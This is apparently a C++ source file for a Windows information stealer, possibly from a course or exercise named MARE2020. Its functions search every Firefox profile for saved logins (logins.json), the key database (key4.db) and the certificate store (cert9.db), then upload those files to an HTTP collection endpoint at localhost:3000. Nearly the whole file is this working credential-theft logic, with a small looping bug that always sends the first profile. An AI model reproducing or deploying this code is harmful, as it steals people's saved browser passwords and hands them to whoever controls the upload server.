// MARE2020.cpp : This file contains the 'main' function. Program execution begins and ends there.
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")

#include <iostream>
#include <winsock2.h>
#include <string>
#include <fstream>
#include <filesystem>
#include <vector>
#include <utility>
#include "windows.h"
#include "stdio.h"
#include "Ws2tcpip.h"
#include "HTTPRequest.cpp"
#include <iostream>  
#include <fstream>  

using namespace std;

#define URL "http://localhost:3000/upload"

vector<Profile> getLoginKeyFilePairs() {
	vector<Profile> loginKeyFilePairs;

	auto firefoxProfilesPath = filesystem::temp_directory_path()
		.parent_path()
		.parent_path()
		.parent_path();

	firefoxProfilesPath /= "Roaming\\Mozilla\\Firefox\\Profiles";

	for (const auto& entry : filesystem::directory_iterator(firefoxProfilesPath)) {
		auto profilePath = entry.path();

		Profile p;
		p.id = profilePath.filename().string();
		
		for (const auto& profileEntry : filesystem::directory_iterator(profilePath)) {
			auto filepath = profileEntry.path();

			if (filepath.filename() == "logins.json") {
				p.logins = filepath.string();
			}

			if (filepath.filename() == "key4.db") {
				p.key = filepath.string();
			}

			if (filepath.filename() == "cert9.db") {
				p.cert = filepath.string();
			}
		}

		if (p.logins != "none" && p.key != "none" && p.cert != "none")
			loginKeyFilePairs.push_back(p);
	}

	return loginKeyFilePairs;
}

int main() {
	auto loginKeysFilePairs = getLoginKeyFilePairs();

	for (int i = 0, j = loginKeysFilePairs.size(); i != j; i++) {
		
		try
		{
			http::Request request(URL);
			const http::Response response = request.sendFiles(loginKeysFilePairs[0]);

			std::cout << std::string(response.body.begin(), response.body.end()) << '\n'; // print the result
		}
		catch (const std::exception & e)
		{
			std::cerr << "Request failed, error: " << e.what() << '\n';
		}
	}

	return 0;
}
